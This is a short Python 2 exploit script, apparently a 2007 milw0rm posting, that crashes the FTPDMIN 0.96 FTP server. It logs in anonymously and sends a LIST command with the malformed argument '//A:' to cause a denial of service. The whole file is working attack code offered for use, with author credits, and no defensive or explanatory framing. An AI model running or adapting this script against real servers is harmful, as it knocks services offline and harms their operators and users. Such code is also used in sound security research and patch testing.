# usr/bin/python

import socket
import time

print
"-----------------------------------------------------------------------"
print "# FTPDMIN v. 0.96 LIST Denial of Service"
print "# url: http://www.sentex.net/~mwandel/ftpdmin/"
print "# author: shinnai"
print "# mail: shinnai[at]autistici[dot]org"
print "# site: http://shinnai.altervista.org"
print
"-----------------------------------------------------------------------\n"

buff = "//A:"

user = "anonymous"
password = "shinnai"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   conn = s.connect(("127.0.0.1",21))
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('USER %s\r\n' % user)
   print "Client -> USER " + user
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('PASS %s\r\n' % password)
   print "Client -> PASS " + password
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('LIST %s\r\n' % buff)
   print "Client -> LIST " + buff
   d = s.recv(1024)
   print d
   time.sleep(2)

except:
   print "- Unable to connect. exiting."

# milw0rm.com [2007-03-20]